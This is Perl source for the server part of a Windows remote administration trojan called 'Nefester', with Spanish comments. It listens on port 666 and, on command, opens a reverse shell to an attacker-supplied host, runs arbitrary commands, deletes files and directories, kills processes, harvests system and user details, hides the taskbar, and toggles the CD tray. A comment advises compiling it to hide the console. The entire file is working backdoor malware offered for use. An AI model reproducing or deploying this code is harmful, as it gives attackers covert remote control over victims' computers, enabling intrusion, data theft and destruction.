#!/usr/bin/perl
#Nefester (sERVidor) 0.1 By Doddy H
#Compilar con perl2exe para sacar consola

use IO::Socket;
use Socket;
use Win32;
use Cwd;
use Win32::MediaPlayer;
use Win32::Process::List;
use Win32::Process;
use Win32::API;

use constant SW_HIDE => 0;
use constant SW_SHOWNORMAL => 1;

my $a = new Win32::API('user32', 'FindWindow', 'PP', 'N');
my $b = new Win32::API('user32', 'ShowWindow', 'NN', 'N');

$test = new Win32::MediaPlayer;

my $sock = IO::Socket::INET->new(LocalPort => 666,
Listen => 10,
Proto => 'tcp',
Reuse => 1); 

print "online\n";

while (my $con = $sock->accept){
$resultado = <$con>;
print "boludo mando : $resultado\n";

if ($resultado=~/msgbox (.*)/ig) {
Win32::MsgBox($1,0,"Mensaje de Dios") 
}

if ($resultado=~/backshell :(.*):(.*):/ig) {

my ($ip,$port) = ($1,$2);

print "conectando $ip con $port\n";

$ip =~s/(\s)+$//;
$port =~s/(\s)+$//;

conectar($ip,$port);
tipo();

sub conectar {
socket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(REVERSE, sockaddr_in($_[1],inet_aton($_[0])));
open (STDIN,">&REVERSE");
open (STDOUT,">&REVERSE");
open (STDERR,">&REVERSE");
}

sub tipo {
print "\n[*] Reverse Shell Starting...\n\n";
if ($^O =~/Win32/ig) {
infowin();
system("cmd.exe");
} else {
infolinux();
#root();  
system("export TERM=xterm;exec sh -i");
}
}

sub infowin {
print "[+] Domain Name : ".Win32::DomainName()."\n";
print "[+] OS Version : ".Win32::GetOSName()."\n";
print "[+] Username : ".Win32::LoginName()."\n\n\n";
}

sub infolinux {
print "[+] System information\n\n";
system("uname -a");
print "\n\n";
}


}

if ($resultado =~/opencd/ig) {

use Win32::API;

my $ventana = Win32::API->new("winmm", "mciSendString", "PPNN", "N");
my $rta = ' ' x 127;  
$ventana->Call('set CDAudio door open', $rta, 127, 0);
print $con "ok"."\r\n";	
}

if ($resultado=~/chauproce K0BRA(.*)K0BRA(.*)K0BRA/ig) {

my ($pid,$numb) = ($1,$2);

$pid=~s/(\s)+$//;
$numb=~s/(\s)+$//;

if (Win32::Process::KillProcess($pid,$numb)) {
print $con "ok\r\n";
}
}

if ($resultado =~/closedcd/ig) {

use Win32::API;

my $ventana = Win32::API->new("winmm", "mciSendString", "PPNN", "N");
my $rta = ' ' x 127;  
$ventana->Call('set CDAudio door closed', $rta, 127, 0);
print $con "ok"."\r\n";	
}

if ($resultado=~/borrarfile K0BRA(.*)K0BRA/ig) {

my $filex = $1;

$filex =~s/(\s)+$//;

print getcwd()."/".$filex."\n\n";

if (unlink(getcwd()."/".$filex)) {
print $con "ok\r\n"; 
}

}



if ($resultado=~/infor/ig) {
print "mando";	
use Win32;


my $domain = Win32::DomainName();
my $chip = Win32::GetChipName();
my $version = Win32::GetOSVersion();
my $nombre = Win32::LoginName();
my  $os = Win32::GetOSName();

print $con ":".$domain.":".$chip.":".$version.":".$nombre.":".$os.":"."\r\n";
}


if ($resultado=~/porters/ig) {

use Net::Netstat::Wrapper;

$por = "";
@ports = Net::Netstat::Wrapper->only_port();
for(@ports) {
$por = $por.":".$_;
}
print $con $por."\r\n";
}


if ($resultado=~/playmusic K0BRA(.*)K0BRA/ig) {

my $cancion = $1;

$cancion =~s/(\s)+$//;

$test->load($cancion);
$test->play;	

}

if ($resultado=~/chdirnow K0BRA(.*)K0BRA/ig) {

my $dir = $1;
$dir =~s/(\s)+$//;


if (chdir($dir)) {
print $con "ok\r\n"; 
} 

}

if ($resultado=~/borrardir K0BRA(.*)K0BRA/ig) {

my $veox = $1;
$veox =~s/(\s)+$//;

if (rmdir(getcwd()."/".$veox)) {
print $con "ok\r\n"; 
}
}



if ($resultado=~/pararmusic/ig) {
$test->close;
}



if ($resultado=~/dirnow ACATOY(.*)/ig) {

my $real = $1;
chomp $real;

$real =~s/(\s)+$//;

print "real $real\n\n";

my @archivos = coleccionar($real);

for (@archivos) {
print $_."\n";
my $todo = $real."/".$_;

print $todo."\n";

if (-f $todo) {
print $con "FILEX".$_."FILEX"."\r\n";
print "File : ".$_."\n";
}

if (-d $todo) {
print $con "DIREX".$_."DIREX"."\r\n";
print "Dir : ".$_."\n";
}

}
}

sub coleccionar {
opendir DIR,$_[0];
my @archivos = readdir DIR;
close DIR;
return @archivos;
}

if ($resultado=~/getcwd/ig) {
print "envie ".getcwd()."\n\n";
print $con getcwd()."\r\n";
}


if ($resultado=~/mostrarpro/ig) {


my $new = Win32::Process::List->new();  
my %process = $new->GetProcesses();
for my $pid (keys %process) {
print $con "PROXEC".$process{$pid}."PROXEC\r\n";
print $con "PIDX".$pid."PIDX\r\n";

}


}

if ($resultado=~/crearnow K0BRA(.*)K0BRA ACATOY(.*)ACATOY/ig) {
my $name = $1;
my $file = $2;

chomp $name;
chomp $file;

$name =~s/(\s)+$//;
$file =~s/(\s)+$//;

print "name is $name end\n";
print "file is $file end\n";

open FILE,">>".$name;
print FILE $file."\n";
close FILE;
}

if ($resultado=~/comando :(.*):/ig) {
print "llego comando $1\n";
print $resultado;
my $temp = qx($1);
print $con $temp."\r";
}

if ($resultado=~/iniciochau/g) {
inicio_chau("Shell_TrayWnd");
} 
if ($resultado=~/iniciovuelve/g) {
inicio_vuelve("Shell_TrayWnd");
} else {
print $resultado;
}
if ($resultado=~/iconovuelve/g) {
icono_vuelve("Program Manager");
}
if ($resultado=~/iconochau/g) {
icono_chau("Program Manager");
}


sub icono_vuelve {
$handle = $a->Call(0,$_[0]);
$b->Call($handle,SW_SHOWNORMAL);

}

sub icono_chau {

$handle = $a->Call(0,$_[0]);
$b->Call($handle,SW_HIDE);

}

sub inicio_vuelve {
$handlex = $a->Call($_[0],0);
$b->Call($handlex,SW_SHOWNORMAL);

}

sub inicio_chau {

$handlea = $a->Call($_[0],0);
$b->Call($handlea,SW_HIDE);

}


}


# ¿ The End ?